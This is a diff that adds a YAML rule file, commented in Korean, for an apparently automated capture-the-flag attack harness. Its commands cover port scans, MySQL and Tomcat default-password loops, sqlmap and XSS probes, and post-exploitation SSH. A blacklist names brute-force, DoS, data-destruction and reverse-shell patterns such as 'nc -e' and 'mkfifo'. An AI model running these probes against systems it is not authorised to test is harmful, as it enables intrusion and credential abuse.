@@ -1,0 +1,251 @@
+# CTF Auto Harness — 공격 규칙 정의
+# 각 공격은 안전성 검증을 통과해야 실행됨
+
+version: 1.0
+attacks:
+
+  # ======================================
+  # [1] RECONNAISSANCE (안전함, 자동 권장)
+  # ======================================
+
+  reconnaissance:
+    - id: nmap_scan
+      name: "Port & Service Scan (nmap)"
+      category: reconnaissance
+      risk: "low"
+      success_rate: 95
+      description: "nmap으로 열린 포트와 서비스 버전 확인"
+      command: "nmap -sT -p- --service-info {target} -o {output}"
+      timeout: 60
+      cleanup: "rm {output}"
+      validator_check: true
+      success_indicator: "Nmap done"
+
+    - id: http_options
+      name: "HTTP OPTIONS Method"
+      category: reconnaissance
+      risk: "low"
+      success_rate: 90
+      description: "HTTP OPTIONS로 지원 메서드 확인"
+      command: "curl -i -X OPTIONS http://{target}/ 2>/dev/null"
+      timeout: 10
+      success_indicator: "Allow:"
+
+    - id: ssh_banner
+      name: "SSH Banner Grab"
+      category: reconnaissance
+      risk: "low"
+      success_rate: 100
+      description: "SSH 서버 배너 정보 추출"
+      command: "ssh-keyscan -t rsa {target} 2>/dev/null | head -1"
+      timeout: 10
+
+    - id: http_headers
+      name: "HTTP Header Analysis"
+      category: reconnaissance
+      risk: "low"
+      success_rate: 95
+      description: "HTTP 응답 헤더로 서버 정보 파악"
+      command: "curl -i -s http://{target}/ 2>/dev/null | head -20"
+      timeout: 10
+      success_indicator: "Server:"
+
+    - id: dns_enum
+      name: "DNS Subdomain Enumeration"
+      category: reconnaissance
+      risk: "low"
+      success_rate: 50
+      description: "DNS 레코드 열거 (조건: 도메인인 경우만)"
+      command: "nslookup -type=A {target} 2>/dev/null"
+      timeout: 10
+
+  # ======================================
+  # [2] VULNERABILITY DETECTION (조건부)
+  # ======================================
+
+  vulnerability:
+    - id: mysql_default_creds
+      name: "MySQL Default Credentials (top 10)"
+      category: vulnerability
+      risk: "medium"
+      success_rate: 45
+      description: "MySQL root 계정 기본 비밀번호 테스트 (10개만)"
+      command: |
+        for pass in "" "root" "password" "123456" "admin" "root123"
+                      "mysql" "test" "guest" "admin123"; do
+          mysql -h {target} -u root -p"$pass" -e "SELECT 1;" 2>/dev/null && \
+          echo "SUCCESS: root:$pass" && break || true
+        done
+      timeout: 30
+      max_attempts: 10
+      success_indicator: "SUCCESS:"
+
+    - id: ftp_anonymous
+      name: "FTP Anonymous Login"
+      category: vulnerability
+      risk: "low"
+      success_rate: 30
+      description: "FTP 익명 로그인 시도"
+      command: "echo -e 'open {target}\\nuser anonymous anonymous\\nls\\nquit' | ftp -n 2>/dev/null"
+      timeout: 15
+      success_indicator: "drwx"
+
+    - id: web_scan_nikto
+      name: "Web Vulnerability Scan (Nikto)"
+      category: vulnerability
+      risk: "medium"
+      success_rate: 70
+      description: "Nikto로 웹 취약점 스캔 (빠른 모드)"
+      command: "nikto -h http://{target} -o - 2>/dev/null | head -50"
+      timeout: 45
+      max_threads: 2
+      success_indicator: "Nikto"
+
+    - id: sqlmap_test
+      name: "SQL Injection Test (basic)"
+      category: vulnerability
+      risk: "high"
+      success_rate: 35
+      description: "sqlmap으로 SQL injection 테스트 (1개 파라미터만, 제한된 시도)"
+      command: |
+        sqlmap -u "http://{target}/search?q=test" --batch \
+                --risk=1 --level=1 -p q --technique=EUS \
+                --timeout=10 --retries=1 2>/dev/null | tail -20
+      timeout: 60
+      max_attempts: 1
+      success_indicator: "vulnerable"
+      warning: "시간이 오래 걸릴 수 있습니다"
+
+    - id: xss_basic
+      name: "XSS Vulnerability Test"
+      category: vulnerability
+      risk: "medium"
+      success_rate: 40
+      description: "기본 XSS payload로 취약점 확인"
+      command: |
+        curl -s "http://{target}/search?q=<script>alert(1)</script>" | \
+        grep -q "<script>alert(1)</script>" && echo "VULNERABLE" || echo "NOT_VULNERABLE"
+      timeout: 15
+      success_indicator: "VULNERABLE"
+
+    - id: ssl_check
+      name: "SSL/TLS Certificate Check"
+      category: vulnerability
+      risk: "low"
+      success_rate: 85
+      description: "SSL 인증서 정보 및 취약점 확인"
+      command: "echo | openssl s_client -connect {target}:443 2>/dev/null | grep -E 'Issuer|Subject|Not After'"
+      timeout: 10
+
+  # ======================================
+  # [3] EXPLOITATION (고위험, 제한됨)
+  # ======================================
+
+  exploitation:
+    - id: cve_2018_15473
+      name: "SSH CVE-2018-15473 (OpenSSH < 7.7)"
+      category: exploitation
+      risk: "high"
+      success_rate: 60
+      description: "OpenSSH 버전 정보 누출 취약점 (정보 수집만)"
+      command: |
+        ssh -v root@{target} 2>&1 | grep -i "OpenSSH" | head -1
+      timeout: 10
+      success_indicator: "OpenSSH"
+      requires_version: "OpenSSH < 7.7"
+
+    - id: tomcat_default
+      name: "Tomcat Default Manager Credentials"
+      category: exploitation
+      risk: "medium"
+      success_rate: 30
+      description: "Tomcat 기본 자격증명 테스트 (top 5)"
+      command: |
+        for cred in "admin:admin" "admin:password" "admin:tomcat" \
+                    "tomcat:tomcat" "manager:manager"; do
+          user="${cred%:*}"
+          pass="${cred#*:}"
+          curl -s -u "$user:$pass" http://{target}:8080/manager/text/list >/dev/null 2>&1 && \
+          echo "SUCCESS: $cred" && break || true
+        done
+      timeout: 15
+      max_attempts: 5
+      success_indicator: "SUCCESS:"
+
+    - id: wordpress_enum
+      name: "WordPress Plugin Enumeration"
+      category: exploitation
+      risk: "low"
+      success_rate: 75
+      description: "WordPress 플러그인 버전 확인"
+      command: |
+        curl -s http://{target}/wp-content/plugins/ 2>/dev/null | \
+        grep -oP 'href=["\']?\K[^"\'>\s]+' | head -20
+      timeout: 15
+
+  # ======================================
+  # [4] POST-EXPLOITATION (방어/KotH용)
+  # ======================================
+
+  post_exploitation:
+    - id: system_info
+      name: "System Information Gathering"
+      category: post_exploitation
+      risk: "low"
+      success_rate: 80
+      description: "시스템 정보 수집 (uname, id 등)"
+      command: "ssh {target} 'uname -a && id' 2>/dev/null"
+      timeout: 10
+      requires_access: "ssh"
+
+    - id: find_logs
+      name: "Find Log Files"
+      category: post_exploitation
+      risk: "low"
+      success_rate: 70
+      description: "중요 로그 파일 위치 파악"
+      command: "ssh {target} 'find /var/log -type f 2>/dev/null | head -20' 2>/dev/null"
+      timeout: 15
+      requires_access: "ssh"
+
+blacklist:
+  # 이 공격들은 validator에서 감지되면 즉시 거절됨
+  brute_force:
+    - "hydra"
+    - "john"
+    - "hashcat"
+    - "medusa"
+    - "password brute"
+
+  dos:
+    - "slowloris"
+    - "ab -c [0-9]{3,}"  # 100개 이상 동시 연결
+    - "wrk -c [0-9]{3,}"
+    - "flooding"
+    - "DDoS"
+
+  directory_scan:
+    - "gobuster"
+    - "wfuzz -w"
+    - "dirb"
+    - "dirbuster"
+
+  data_destruction:
+    - "DELETE"
+    - "DROP"
+    - "rm /"
+    - "truncate"
+
+  privilege_escalation:
+    - "reverse shell"
+    - "bash -i"
+    - "mkfifo"
+    - "nc -e"
+
+defaults:
+  timeout: 30
+  max_retries: 1
+  max_threads: 2
+  max_payload_size: 1024
+  log_all_output: true
+  preserve_evidence: true
